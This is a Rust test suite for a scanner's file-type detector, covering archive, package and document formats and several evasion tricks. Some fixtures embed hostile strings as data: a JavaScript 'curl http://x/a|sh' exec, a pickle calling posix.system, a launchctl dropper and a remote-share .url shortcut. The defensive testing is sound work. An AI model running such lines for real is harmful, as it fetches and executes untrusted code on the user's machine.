    assert_eq!(ft, FileType::TarGz);
}

#[test]
fn arch_pkg_detected_by_pkginfo() {
    let mut tar = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar);
        let body = b"pkgname = demo\n";
        let mut h = tar::Header::new_ustar();
        h.set_path(".PKGINFO").unwrap();
        h.set_size(body.len() as u64);
        h.set_cksum();
        b.append(&h, &body[..]).unwrap();
        b.finish().unwrap();
    }
    let zst = zstd::encode_all(&tar[..], 3).unwrap();
    let (ft, _) = detect_from_content(Path::new("demo-1.0-1-x86_64.pkg.tar.zst"), &zst).unwrap();
    assert_eq!(ft, FileType::PkgArch);
}

/// Build a zip local-header chain from (name, stored-data) pairs.
fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut out = Vec::new();
    for (name, body) in entries {
        out.extend_from_slice(b"PK\x03\x04");
        out.extend_from_slice(&[0u8; 14]); // version..crc
        out.extend_from_slice(&(body.len() as u32).to_le_bytes()); // compressed
        out.extend_from_slice(&(body.len() as u32).to_le_bytes()); // uncompressed
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes()); // extra
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(body);
    }
    out.extend_from_slice(b"PK\x01\x02");
    out
}

#[test]
fn a_data_descriptor_chain_is_still_walkable() {
    // Android's packager writes entries with general-purpose bit 3 set
    // and the sizes present in the local header anyway, followed by a
    // PK\x07\x08 descriptor record. Treating that record as the end of
    // the chain made every such zip unwalkable -- which is how a 21 MB
    // APK fell through to a substring match and was called an Office
    // document.
    let mut zip = Vec::new();
    for (name, body) in [
        ("META-INF/MANIFEST.MF", b"Manifest".as_slice()),
        ("AndroidManifest.xml", b"\x03\x00"),
    ] {
        zip.extend_from_slice(b"PK\x03\x04");
        zip.extend_from_slice(&[0u8; 2]);
        zip.extend_from_slice(&0x08u16.to_le_bytes()); // flags: bit 3
        zip.extend_from_slice(&[0u8; 10]);
        zip.extend_from_slice(&(body.len() as u32).to_le_bytes());
        zip.extend_from_slice(&(body.len() as u32).to_le_bytes());
        zip.extend_from_slice(&(name.len() as u16).to_le_bytes());
        zip.extend_from_slice(&0u16.to_le_bytes());
        zip.extend_from_slice(name.as_bytes());
        zip.extend_from_slice(body);
        zip.extend_from_slice(b"PK\x07\x08");
        zip.extend_from_slice(&[0u8; 12]);
    }
    zip.extend_from_slice(b"PK\x01\x02");
    assert_eq!(
        zip_has_top_level_entry(&zip, b"AndroidManifest.xml"),
        Some(true)
    );
    assert_eq!(
        classify_pk(Path::new("nameless"), &zip).0,
        FileType::ApkAndroid
    );
}

#[test]
fn an_extensionless_android_package_is_still_an_apk() {
    let apk = zip_of(&[
        ("AndroidManifest.xml", b"\x03\x00\x08\x00"),
        ("classes.dex", b"dex"),
    ]);
    assert_eq!(
        classify_pk(Path::new("VirusShare_52b318f"), &apk).0,
        FileType::ApkAndroid
    );
}

#[test]
fn a_stored_office_member_does_not_make_the_outer_zip_a_package() {
    // The outer file holds one `.xlsx`, uncompressed, so the inner
    // package's own `[Content_Types].xml` header is present verbatim in
    // the outer bytes. A substring test calls the carrier an OOXML
    // document and nothing walks its members; the entry walk does not.
    let inner = zip_of(&[("[Content_Types].xml", b"<Types/>")]);
    let outer = zip_of(&[("Persons_status_details_list.xlsx", &inner)]);
    assert!(memchr::memmem::find(&outer, b"[Content_Types].xml").is_some());
    assert_eq!(
        zip_has_top_level_entry(&outer, b"[Content_Types].xml"),
        Some(false)
    );
    assert_eq!(
        classify_pk(Path::new("carrier.docx"), &outer).0,
        FileType::Zip
    );
    // The inner document is still recognized on its own.
    assert_eq!(
        classify_pk(Path::new("inner.xlsx"), &inner).0,
        FileType::Ooxml
    );
}

#[test]
fn a_large_archive_exceeding_max_entries_is_not_an_ooxml_package() {
    // A large archive whose first MAX_ENTRIES members do not include
    // `[Content_Types].xml` must not fall back to a loose substring match
    // and classify the carrier as OOXML just because an inner script/exploit
    // mentions `[Content_Types].xml`.
    let mut entries = Vec::new();
    for i in 0..8200 {
        entries.push((format!("file_{i}.txt"), b"dummy content".as_slice()));
    }
    let entries_ref: Vec<(&str, &[u8])> = entries
        .iter()
        .map(|(name, body)| (name.as_str(), *body))
        .collect();
    let zip = zip_of(&entries_ref);
    assert_eq!(
        zip_has_top_level_entry(&zip, b"[Content_Types].xml"),
        Some(false)
    );
    assert_eq!(
        classify_pk(Path::new("release-6.4.124"), &zip).0,
        FileType::Zip
    );
}

#[test]
fn a_malformed_header_falls_back_rather_than_denying() {
    // A weaponized package whose first header declares a nonsense name
    // length and a half-gigabyte compressed size inside a 15 KB file.
    // The walk cannot follow that, and must not conclude "not a package":
    // these are Office documents, deliberately broken.
    let mut zip = zip_of(&[("[Content_Types].xml", b"<Types/>")]);
    zip[18..22].copy_from_slice(&538_968_429u32.to_le_bytes());
    zip[26..28].copy_from_slice(&4096u16.to_le_bytes());
    assert_eq!(zip_has_top_level_entry(&zip, b"[Content_Types].xml"), None);
    assert_eq!(classify_pk(Path::new("lure.docx"), &zip).0, FileType::Ooxml);
}

#[test]
fn a_streaming_entry_falls_back_rather_than_denying() {
    // Bit 3 puts the sizes in a trailing descriptor, so the chain cannot
    // be stepped. Returning "not a package" there would misclassify real
    // documents written by streaming producers.
    let mut zip = zip_of(&[("word/document.xml", b"x")]);
    zip[6] = 0x08; // general-purpose bit 3
    zip[18..22].copy_from_slice(&0u32.to_le_bytes());
    assert_eq!(zip_has_top_level_entry(&zip, b"[Content_Types].xml"), None);
}

#[test]
fn a_url_shortcut_is_identified_as_text() {
    // Otherwise it comes back `unknown`, and an unknown archive member is
    // never analyzed -- which for a delivery zip means the payload is the
    // one file nothing looks at.
    let body = b"[InternetShortcut]\r\nURL=file:\\\\203.0.113.1@80\\a\\b.lnk\r\n";
    assert_eq!(
        detect_from_content(Path::new("scan.pdf.url"), body).map(|(t, _)| t),
        Some(FileType::Text)
    );
    // Leading whitespace does not hide it.
    let padded = [b"\r\n  ".as_slice(), body.as_slice()].concat();
    assert_eq!(
        detect_from_content(Path::new("x"), &padded).map(|(t, _)| t),
        Some(FileType::Text)
    );
    // Neither does case: Windows matches section names case-insensitively.
    let shouted = b"[INTERNETSHORTCUT]\r\nURL=http://example.invalid/\r\n";
    assert_eq!(
        detect_from_content(Path::new("x"), shouted).map(|(t, _)| t),
        Some(FileType::Text)
    );
    // A bare `[` prefix is not a shortcut.
    assert_eq!(
        detect_from_content(Path::new("x"), b"[Internet").map(|(t, _)| t),
        None
    );
}

#[test]
fn an_office_extension_without_the_opc_marker_is_a_zip() {
    // The evasion this closes: rename a zip to `.xlsm` and the office
    // analyzer takes it, finds no OPC parts, and nothing walks the members.
    let mut zip = b"PK\x03\x04".to_vec();
    zip.extend_from_slice(b"\x14\x00\x00\x00\x08\x00");
    zip.extend_from_slice(b"documents.doc");
    zip.extend(std::iter::repeat_n(0u8, 64));
    let (ft, _) = classify_pk(Path::new("invoice.xlsm"), &zip);
    assert_eq!(ft, FileType::Zip);
}

#[test]
fn an_office_extension_with_the_opc_marker_is_still_ooxml() {
    let mut zip = b"PK\x03\x04".to_vec();
    zip.extend_from_slice(b"\x14\x00\x00\x00\x08\x00");
    zip.extend_from_slice(b"[Content_Types].xml");
    zip.extend(std::iter::repeat_n(0u8, 64));
    for name in ["a.docx", "a.xlsm", "a.pptm", "a.dotx"] {
        let (ft, _) = classify_pk(Path::new(name), &zip);
        assert_eq!(ft, FileType::Ooxml, "{name}");
    }
}

#[test]
fn zip_package_ecosystems_by_extension() {
    for (name, expected) in [
        ("pkg.conda", FileType::Conda),
        ("lib.egg", FileType::Egg),
        ("Newtonsoft.Json.nupkg", FileType::Nupkg),
        ("App.ipa", FileType::Ipa),
        ("ext.vsix", FileType::Vsix),
    ] {
        let data = b"PK\x03\x04zip body";
        let (ft, _) = detect_from_content(Path::new(name), data).unwrap();
        assert_eq!(ft, expected, "{name}");
    }
}

#[test]
fn sevenz_archive() {
    let data = b"7z\xBC\xAF\x27\x1C\x00\x00";
    let (ft, _) = detect_from_content(Path::new("data.7z"), data).unwrap();
    assert_eq!(ft, FileType::SevenZ);
}

#[test]
fn too_short_returns_none() {
    assert!(detect_from_content(Path::new("x"), b"x").is_none());
}

fn content_type(name: &str, data: &[u8]) -> Option<FileType> {
    detect_from_content(Path::new(name), data).map(|(ft, _)| ft)
}

/// A script that opens with a binary format's first letters is still a
/// script: every such format carries a NUL or control byte in its header.
#[test]
fn a_short_signature_followed_by_text_is_not_that_format() {
    let body = "=1;require('child_process').exec('curl http://x/a|sh');\n";
    for magic in [
        "MZ", "BM", "ID3", "OTTO", "true", "typ1", "ttcf", "wOFF", "Fasd", "hsqs", "sqsh", "ITSF",
        "Cr24", "xar!", "Rar!", "GIF89a", "PKCS7",
    ] {
        let script = format!("{magic}{body}");
        assert_eq!(content_type("a.js", script.as_bytes()), None, "{magic}");
    }
    assert_eq!(content_type("x", b"true\ntrue\nfalse\n"), None);
    assert_eq!(content_type("x", b"abcdftypisom and some prose"), None);
    // Text-header formats keep their claim.
    assert_eq!(
        content_type("x", b"%PDF-1.4\n1 0 obj\n<<>>\n"),
        Some(FileType::Pdf)
    );
    assert_eq!(
        content_type("x", b"REGEDIT4\r\n[HKEY_CURRENT_USER]\r\n"),
        Some(FileType::Reg)
    );
    let deb = b"!<arch>\ndebian-binary   1342177295  0     0     100644  4         `\n2.0\n";
    assert_eq!(content_type("x", deb), Some(FileType::Deb));
}

#[test]
fn python_bytecode_by_magic_number() {
    // CPython 3.14 (3627) no longer has 0x0D as its second byte.
    let pyc = b"\x2b\x0e\r\n\0\0\0\0\x89\x36\x29\x6a\xbe\x34\0\0\xe3\0\0\0";
    assert_eq!(content_type("x", pyc), Some(FileType::PythonBytecode));
    let py27 = b"\x03\xf3\r\n\xde\x1d\xef\x50c\0\0\0\0\0\0\0\0\x02\0\0\0";
    assert_eq!(content_type("x", py27), Some(FileType::PythonBytecode));
    // Kotlin/Native metadata begins with 0xCC0A followed by CRLF. That
    // happens to lie in a broad historical Python range, but is not a
    // CPython magic number and must stay an ordinary binary data member.
    let kotlin_metadata = b"\x0a\xcc\r\n\x0a\x00\x00\x00nativeFill\n";
    assert_eq!(content_type("x", kotlin_metadata), None);
    // Text whose first line is one character, re-converted to CR CR LF.
    assert_eq!(content_type("x", b"{\r\r\n\"a\": 1\r\r\n}\r\r\n"), None);
}

#[test]
fn lockfiles_by_header_not_by_mention() {
    let yarn = b"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\nleft-pad@^1.3.0:\n";
    assert_eq!(
        content_type("yarn.abc123.lock", yarn),
        Some(FileType::YarnLock)
    );
    let cargo = b"# This file is automatically @generated by Cargo.\n# It is not intended for manual editing.\nversion = 4\n";
    assert_eq!(content_type("x", cargo), Some(FileType::CargoLock));
    let poetry = b"# This file is automatically @generated by Poetry 1.8.3 and should not be changed by hand.\n\n[[package]]\n";
    assert_eq!(content_type("x", poetry), Some(FileType::PoetryLock));
    assert_eq!(
        content_type("x", b"lockfileVersion: '9.0'\n\nimporters:\n"),
        Some(FileType::PnpmLock)
    );
    // Source that writes a yarn header is source.
    let js = b"const header = '# THIS IS AN AUTOGENERATED FILE.\\n# yarn lockfile v1\\n';\nrequire('child_process').exec(x);\n";
    assert_eq!(content_type("x", js), None);
}

#[test]
fn markup_is_typed_by_its_root_element() {
    // A dropper that writes a LaunchAgent is the language it is written in.
    let dropper = b"import os\np = '''<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict/></plist>'''\nos.system('launchctl load x')\n";
    assert_eq!(content_type("x.py", dropper), None);
    let plist = b"\xEF\xBB\xBF<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"x\">\n<plist version=\"1.0\"><dict/></plist>";
    assert_eq!(content_type("x", plist), Some(FileType::Plist));
    let svg = b"<!-- Created with Inkscape -->\n<svg\n\txmlns=\"http://www.w3.org/2000/svg\"/>";
    assert_eq!(content_type("x", svg), Some(FileType::Svg));
    let resx = b"\xEF\xBB\xBF<?xml version=\"1.0\"?>\n<root><xsd:schema/></root>";
    assert_eq!(content_type("x", resx), Some(FileType::Xml));
}

#[test]
fn pickles_by_frame_or_torch_magic_whatever_the_name() {
    let proto5 = b"\x80\x05\x95\x1b\0\0\0\0\0\0\0\x8c\x05posix\x94\x8c\x06system\x94\x93\x94.";
    assert_eq!(content_type("model.bin", proto5), Some(FileType::Pickle));
    let torch = b"\x80\x02\x8a\x0a\x6c\xfc\x9c\x46\xf9\x20\x6a\xa8\x50\x19.\x80\x02M\xe9\x03.";
    assert_eq!(content_type("weights", torch), Some(FileType::Pickle));
    // Protocol 2 opens with two bytes other formats share; the name decides.
    let proto2 = b"\x80\x02}q\0(X\x01\0\0\0aq\x01K\x01u.";
    assert_eq!(content_type("x.pkl", proto2), Some(FileType::Pickle));
    assert_eq!(content_type("x.bin", proto2), None);
}

fn build_zstd_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
    zstd::encode_all(&build_plain_tar(members)[..], 3).unwrap()
}

#[test]
fn tar_packages_by_layout_whatever_the_name() {
    let gem = build_plain_tar(&[
        ("metadata.gz", b"x"),
        ("data.tar.gz", b"x"),
        ("checksums.yaml.gz", b"x"),
    ]);
    assert_eq!(content_type("blob", &gem), Some(FileType::Gem));
    let gpkg = build_plain_tar(&[("foo-1.0/gpkg-1", b""), ("foo-1.0/image.tar", b"")]);
    assert_eq!(content_type("blob", &gpkg), Some(FileType::GentooBinpkg));
    let krate = build_gzip_tar(&[
        ("foo-1.0/Cargo.toml", b"[package]"),
        ("foo-1.0/Cargo.toml.orig", b""),
    ]);
    assert_eq!(content_type("blob", &krate), Some(FileType::Crate));
    let alpine = build_gzip_tar(&[(".SIGN.RSA.builder.rsa.pub", b"sig")]);
    assert_eq!(content_type("blob", &alpine), Some(FileType::ApkAlpine));
    let xbps = build_zstd_tar(&[("./props.plist", b"<plist/>"), ("./files.plist", b"")]);
    assert_eq!(content_type("blob", &xbps), Some(FileType::Xbps));
    let arch = build_zstd_tar(&[
        (".BUILDINFO", b""),
        (".MTREE", b""),
        (".PKGINFO", b""),
        ("usr/bin/x", b""),
    ]);
    assert_eq!(content_type("blob", &arch), Some(FileType::PkgArch));
    // A layout that needs a different codec is only the generic tar.
    let zstd_npm = build_zstd_tar(&[("package/package.json", b"{}")]);
    assert_eq!(content_type("blob", &zstd_npm), Some(FileType::TarZst));
}

#[test]
fn zip_packages_by_member_whatever_the_name() {
    for (entries, want) in [
        (
            &[
                ("META-INF/MANIFEST.MF", &b"Main-Class: a.Main"[..]),
                ("a/Main.class", b""),
            ][..],
            FileType::Jar,
        ),
        (
            &[
                ("foo/__init__.py", &b""[..]),
                ("foo-1.0.dist-info/WHEEL", b""),
            ][..],
            FileType::Whl,
        ),
        (
            &[
                ("[Content_Types].xml", &b"<Types/>"[..]),
                ("Foo.nuspec", b"<package/>"),
            ][..],
            FileType::Nupkg,
        ),
        (
            &[("Payload/Foo.app/Info.plist", &b""[..])][..],
            FileType::Ipa,
        ),
        (&[("EGG-INFO/PKG-INFO", &b""[..])][..], FileType::Egg),
        (
            &[("manifest.json", &b"{}"[..]), ("META-INF/mozilla.rsa", b"")][..],
            FileType::Xpi,
        ),
        (
            &[("metadata.json", &b"{}"[..]), ("info-foo-1.0.tar.zst", b"")][..],
            FileType::Conda,
        ),
    ] {
        assert_eq!(
            classify_pk(Path::new("blob"), &zip_of(entries)).0,
            want,
            "{want:?}"
        );
    }
    // A manifest merely mentioned in a stored member is not a VSIX.
    let mention = zip_of(&[("notes.txt", b"see extension.vsixmanifest")]);
    assert_eq!(classify_pk(Path::new("blob"), &mention).0, FileType::Zip);
}

#[test]
fn asar_lzma_and_msi_by_structure() {
    let json = br#"{"files":{"main.js":{"size":5,"offset":"0"}}}"#;
    let mut asar = [
        4u32,
        json.len() as u32 + 8,
        json.len() as u32 + 4,
        json.len() as u32,
    ]
    .iter()
    .flat_map(|n| n.to_le_bytes())
    .collect::<Vec<_>>();
    asar.extend_from_slice(json);
    assert_eq!(content_type("app", &asar), Some(FileType::Asar));

    let lzma = b"\x5d\0\0\x80\0\xff\xff\xff\xff\xff\xff\xff\xff\0\x3b\x9d";
    assert_eq!(content_type("blob", lzma), Some(FileType::Lzma));
    // Chromium `.pak`: a plausible dictionary and size, but no 0x5D.
    let pak = b"\x05\0\0\0\x01\0\0\0\0\0\0\0\0\0\x12\0\0\0";
    assert_ne!(content_type("locale.pak", pak), Some(FileType::Lzma));

    let mut ole = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec();
    ole.resize(1024 + 0x60, 0);
    ole[0x1E] = 9; // 512-byte sectors
    ole[0x30..0x34].copy_from_slice(&0u32.to_le_bytes()); // directory at sector 0
    ole[512 + 0x50..512 + 0x60].copy_from_slice(&MSI_CLSIDS[0]);
    assert_eq!(content_type("setup.bin", &ole), Some(FileType::Msi));
    ole[512 + 0x50..512 + 0x60].fill(0);
    assert_eq!(content_type("setup.msi", &ole), Some(FileType::OleDoc));
}
